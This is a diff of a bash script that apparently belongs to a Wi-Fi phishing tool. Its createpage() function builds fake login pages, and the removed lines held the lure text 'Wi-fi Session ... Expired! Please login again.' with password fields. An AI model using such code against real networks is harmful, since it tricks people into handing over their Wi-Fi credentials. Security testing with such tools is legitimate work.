@@ -38,19 +38,15 @@ banner()  {
 }
 
 createpage() {
-  default_cap1="Wi-fi Session for '$use_ssid' Expired!"
-  default_cap2="Please login again."
   default_pass_text="Password"
   default_sub_text="Log-In"
 
   for site_folder in sites/*/; do
-    site_name=$(basename "$site_folder")
-    index_path="$(dirname "$site_folder")/index.html"
+    index_path="${site_folder%/}/index.html"
     echo "<!DOCTYPE html>" > "$index_path"
     echo "<html>" >> "$index_path"
     echo "<body bgcolor=\"gray\" text=\"white\">" >> "$index_path"
     IFS=$'\n'
-    printf '<center><h2> %s <br><br> %s </h2></center><center>\n' "$default_cap1" "$default_cap2" >> "$index_path"
     
     for file in "$site_folder"/*; do
       if [ -f "$file" ]; then
